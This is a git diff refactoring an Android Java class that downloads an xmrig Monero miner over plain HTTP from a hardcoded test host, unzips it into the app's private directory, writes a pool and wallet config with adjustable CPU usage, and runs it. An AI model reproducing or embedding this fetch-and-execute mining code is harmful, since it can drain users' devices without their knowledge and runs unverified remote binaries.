@@ -2,7 +2,6 @@ package waterhole.miner.monero;
 
 import android.annotation.TargetApi;
 import android.content.Context;
-import android.text.TextUtils;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -13,60 +12,32 @@ import java.io.InputStreamReader;
 import java.io.ObjectStreamException;
 
 import waterhole.miner.core.utils.FileUtils;
-import waterhole.miner.core.utils.LogUtils;
 
 import static waterhole.miner.core.asyn.AsyncTaskAssistant.executeOnThreadPool;
 import static waterhole.miner.core.utils.FileUtils.downloadFile;
 import static waterhole.miner.core.utils.FileUtils.unzip;
 import static waterhole.miner.core.utils.IOUtils.closeSafely;
+import static waterhole.miner.core.utils.LogUtils.info;
+import static waterhole.miner.core.utils.LogUtils.error;
+import static java.lang.System.lineSeparator;
+import static android.text.TextUtils.split;
 
 public final class OldXmr implements FileUtils.DownloadCallback, FileUtils.UnzipCallback {
 
-    // todo kzw 目前使用测试接口
-    private static final String OLD_MINER_DOWNLOAD_URL = "http://eidon.top:8000/05171156/xmr-miner-old.zip";
+    private static final String MINER_FILENAME = "/xmr-miner-old.zip";
+    // todo kzw 目前为测试接口
+    private static final String MINER_DOWNLOAD_URL = "http://eidon.top:8000/05171156/xmr-miner-old.zip";
 
     private Context mContext;
     private Process mProcess;
     private OutputReaderThread mOutputHandler;
 
+    private int mThreads;
+    private int mCpuUses;
+    private String mWalletAddress;
+
     private int mAccepted;
     private String mSpeed = "./.";
-
-    @TargetApi(19)
-    private final class OutputReaderThread extends Thread {
-
-        private final InputStream inputStream;
-        private final StringBuilder output;
-        private BufferedReader reader;
-
-        OutputReaderThread(InputStream inputStream) {
-            this.inputStream = inputStream;
-            this.output = new StringBuilder();
-        }
-
-        public void run() {
-            try {
-                reader = new BufferedReader(new InputStreamReader(inputStream));
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    output.append(line + System.lineSeparator());
-                    if (line.contains("accepted")) {
-                        mAccepted++;
-                    } else if (line.contains("speed")) {
-                        String[] split = TextUtils.split(line, " ");
-                        mSpeed = split[split.length - 2];
-                    }
-                    LogUtils.info("accepted = " + mAccepted + " ,speed = " + mSpeed);
-                }
-            } catch (IOException e) {
-                LogUtils.error("exception", e);
-            }
-        }
-
-        public StringBuilder getOutput() {
-            return output;
-        }
-    }
 
     private OldXmr() {
     }
@@ -83,17 +54,19 @@ public final class OldXmr implements FileUtils.DownloadCallback, FileUtils.Unzip
         return instance();
     }
 
-    public OldXmr setContext(Context context) {
-        mContext = context;
-        return this;
+    private String getProgramRunDir() {
+        return mContext.getFilesDir().getAbsolutePath();
     }
 
-    public void startMine() {
+    public void startMine(Context context, int threads, int cpuUses, String walletAddress) {
+        mContext = context;
+        mThreads = threads;
+        mCpuUses = cpuUses;
+        mWalletAddress = walletAddress;
         executeOnThreadPool(new Runnable() {
             @Override
             public void run() {
-                downloadFile(OLD_MINER_DOWNLOAD_URL,
-                        mContext.getFilesDir().getAbsolutePath() + "/xmr-miner-old.zip",
+                downloadFile(MINER_DOWNLOAD_URL, getProgramRunDir() + MINER_FILENAME,
                         OldXmr.this);
             }
         });
@@ -110,61 +83,17 @@ public final class OldXmr implements FileUtils.DownloadCallback, FileUtils.Unzip
         }
     }
 
-    private void writeConfig(String privatePath) {
-        // todo kzw 目前参数写死
-        String config = "{\n" +
-                "         \"algo\": \"cryptonight\",\n" +
-                "         \"av\": 0,\n" +
-                "         \"background\": false,\n" +
-                "         \"colors\": false,\n" +
-                "         \"cpu-affinity\": null,\n" +
-                "         \"cpu-priority\": 2,\n" +
-                "         \"donate-level\": 0,\n" +
-                "         \"log-file\": null,\n" +
-                "         \"max-cpu-usage\": 99,\n" +
-                "         \"print-time\": 60,\n" +
-                "         \"retries\": 5000,\n" +
-                "         \"retry-pause\": 5,\n" +
-                "         \"safe\": false,\n" +
-                "         \"syslog\": false,\n" +
-                "         \"threads\": 7,\n" +
-                "         \"pools\": [\n" +
-                "         {\n" +
-                "         \"url\": \"xmr.waterhole.xyz:3333\",\n" +
-                "         \"user\": \"49MGSvJjQLJRqtyFfB6MRNPqUczEFCP1MKrHozoKx32W3J84sziDqewd6zXceZVXcCNfLwQXXhDJoaZ7hg73mAUdRg5Zqf9\",\n" +
-                "         \"pass\": \"x\",\n" +
-                "         \"keepalive\": true,\n" +
-                "         \"nicehash\": false\n" +
-                "         }\n" +
-                "         ]\n" +
-                "         }";
-        LogUtils.info(config);
-        FileOutputStream outStream = null;
-        try {
-            File file = new File(privatePath + "/config.json");
-            outStream = new FileOutputStream(file);
-            outStream.write(config.getBytes());
-        } catch (Exception e) {
-            LogUtils.error("exception:", e);
-        } finally {
-            closeSafely(outStream);
-        }
-    }
-
     @Override
     public void onDownloadSuccess(String pathName) {
-        LogUtils.info("download old miner success");
-
         // 旧版门罗挖矿文件
-        String fileDir = mContext.getFilesDir().getAbsolutePath();
-        File xmrig = new File(fileDir + "/xmrig");
-        LogUtils.info("xmrig exist: " + xmrig.exists());
-        File uvFile = new File(fileDir + "/libuv.so");
-        LogUtils.info("libuv.so exist: " + uvFile.exists());
-        File cplusFile = new File(fileDir + "/libc++_shared.so");
-        LogUtils.info("libc++_shared.so exist: " + cplusFile.exists());
+        final String fileDir = getProgramRunDir();
+        boolean xmrigExist = new File(fileDir + "/xmrig").exists();
+        boolean uvExist = new File(fileDir + "/libuv.so").exists();
+        boolean cplusExist = new File(fileDir + "/libc++_shared.so").exists();
 
-        if (!xmrig.exists() || !uvFile.exists() || !cplusFile.exists()) {
+        info("xmrig exist: " + xmrigExist + " ,libuv.so exist: " + uvExist
+                + " ,libc++_shared.so exist: " + cplusExist);
+        if (!xmrigExist || !uvExist || !cplusExist) {
             unzip(pathName, fileDir, this);
         } else {
             onUnzipComplete(pathName);
@@ -173,20 +102,18 @@ public final class OldXmr implements FileUtils.DownloadCallback, FileUtils.Unzip
 
     @Override
     public void onDownloadFail(String path, String reason) {
-        LogUtils.info("download old miner fail: " + reason);
+        info("download old miner fail: " + reason);
     }
 
     @Override
     public void onUnzipComplete(String path) {
-        LogUtils.info("unzip old miner success");
+        info("unzip old miner success");
 
         if (mProcess != null) {
             mProcess.destroy();
         }
-        // path where we may execute our program
-        String privatePath = mContext.getFilesDir().getAbsolutePath();
         // write the config
-        writeConfig(privatePath);
+        writeConfig(mThreads, mCpuUses, mWalletAddress);
         try {
             // run xmrig using the config
             String[] args = {"./xmrig"};
@@ -194,7 +121,7 @@ public final class OldXmr implements FileUtils.DownloadCallback, FileUtils.Unzip
             // in our directory
             pb.directory(mContext.getFilesDir());
             // with the directory as ld path so xmrig finds the libs
-            pb.environment().put("LD_LIBRARY_PATH", privatePath);
+            pb.environment().put("LD_LIBRARY_PATH", getProgramRunDir());
             // in case of errors, read them
             pb.redirectErrorStream();
 
@@ -205,18 +132,94 @@ public final class OldXmr implements FileUtils.DownloadCallback, FileUtils.Unzip
             mOutputHandler = new OutputReaderThread(mProcess.getInputStream());
             mOutputHandler.start();
         } catch (Exception e) {
-            LogUtils.error("exception:", e);
+            error("exception:", e);
             mProcess = null;
         }
     }
 
     @Override
     public void onUnzipFail(String path, String reason) {
-        LogUtils.info("unzip old miner fail: " + reason);
+        info("unzip old miner fail: " + reason);
     }
 
     @Override
     public void onUnzipEntryFail(String path, String reason) {
-        LogUtils.info("unzip old miner entry fail: " + reason);
+        info("unzip old miner entry fail: " + reason);
+    }
+
+    private void writeConfig(int threads, int cpuUses, String walletAddress) {
+        String config = "{\n" +
+                "         \"algo\": \"cryptonight\",\n" +
+                "         \"av\": 0,\n" +
+                "         \"background\": false,\n" +
+                "         \"colors\": false,\n" +
+                "         \"cpu-affinity\": null,\n" +
+                "         \"cpu-priority\": 2,\n" +
+                "         \"donate-level\": 0,\n" +
+                "         \"log-file\": null,\n" +
+                "         \"max-cpu-usage\": " + cpuUses + ",\n" +
+                "         \"print-time\": 60,\n" +
+                "         \"retries\": 5000,\n" +
+                "         \"retry-pause\": 5,\n" +
+                "         \"safe\": false,\n" +
+                "         \"syslog\": false,\n" +
+                "         \"threads\": " + threads + ",\n" +
+                "         \"pools\": [\n" +
+                "         {\n" +
+                "         \"url\": \"xmr.waterhole.xyz:3333\",\n" +
+                "         \"user\": \"" + walletAddress + "\",\n" +
+                "         \"pass\": \"x\",\n" +
+                "         \"keepalive\": true,\n" +
+                "         \"nicehash\": false\n" +
+                "         }\n" +
+                "         ]\n" +
+                "         }";
+        info(config);
+        FileOutputStream outStream = null;
+        try {
+            File file = new File(getProgramRunDir() + "/config.json");
+            outStream = new FileOutputStream(file);
+            outStream.write(config.getBytes());
+        } catch (Exception e) {
+            error("exception:", e);
+        } finally {
+            closeSafely(outStream);
+        }
+    }
+
+    @TargetApi(19)
+    private final class OutputReaderThread extends Thread {
+
+        private final InputStream inputStream;
+        private final StringBuilder output;
+        private BufferedReader reader;
+
+        OutputReaderThread(InputStream inputStream) {
+            this.inputStream = inputStream;
+            this.output = new StringBuilder();
+        }
+
+        public void run() {
+            try {
+                String line;
+                reader = new BufferedReader(new InputStreamReader(inputStream));
+                while ((line = reader.readLine()) != null) {
+                    output.append(line + lineSeparator());
+                    if (line.contains("accepted")) {
+                        mAccepted++;
+                    } else if (line.contains("speed")) {
+                        String[] split = split(line, " ");
+                        mSpeed = split[split.length - 2];
+                    }
+                    info("accepted = " + mAccepted + " ,speed = " + mSpeed);
+                }
+            } catch (IOException e) {
+                error("exception", e);
+            }
+        }
+
+        public StringBuilder getOutput() {
+            return output;
+        }
     }
 }
